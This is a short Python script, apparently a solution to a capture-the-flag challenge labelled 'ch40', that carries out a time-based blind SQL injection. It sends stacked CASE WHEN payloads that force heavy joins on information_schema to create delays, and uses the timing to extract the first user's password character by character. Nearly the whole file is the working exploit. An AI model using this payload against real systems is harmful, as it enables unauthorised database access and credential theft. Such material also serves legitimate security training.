import os
import string
import sys
import time
import requests

spec_ = '!@#$%&*?^.,-+='
dic_ = string.digits + string.ascii_letters + spec_
numm = 1
c = ''
url_ = """/ch40/?action=member&member=1;"""
for a in range(8):
    for i in dic_:
        b = ord(i)
        pay = """ SELECT+CASE+WHEN+(SELECT+substr(password,+%d,1)+FROM+users+LIMIT+1)=chr(%d)+THEN+100>(select+count(*)from+information_schema.columns,information_schema.columns+T1,information_schema.columns+T2)+ELSE+true+END--+-""" % (numm, b)
        url = url_ + pay
        start = time.time()
        r = requests.post(url)
        stop = time.time()
        if stop - start > 2:
            numm +=1
            c +=chr(b) 
            print(c)
